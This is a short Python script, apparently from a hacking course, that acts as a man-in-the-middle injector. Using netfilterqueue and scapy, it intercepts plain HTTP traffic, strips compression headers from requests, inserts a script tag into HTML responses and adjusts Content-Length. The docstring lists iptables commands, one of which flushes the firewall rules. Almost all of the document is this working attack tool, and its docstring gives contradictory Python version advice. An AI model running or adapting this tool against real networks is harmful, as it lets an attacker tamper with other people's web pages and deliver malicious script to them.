#!/usr/bin/env python

"""
Start it with python 2 not python 3
netfilterqueue only works with Python 3 < version 3.7

Code Injector inserts java script into the called webpage

it needs to set the following commands
iptables --flush
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
"""

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print(" Request: ")
            # replace 'Accept-Encoding: gzip, deflating with' empty string
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            # only for demonstration of the packet content
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(" Response: ")
            # only for demonstration of the packet content
            # print(scapy_packet.show())
            # place java script at the end of web page (body)
            injection_code = "<script>alert(' java script message injection ');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                print(content_length)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
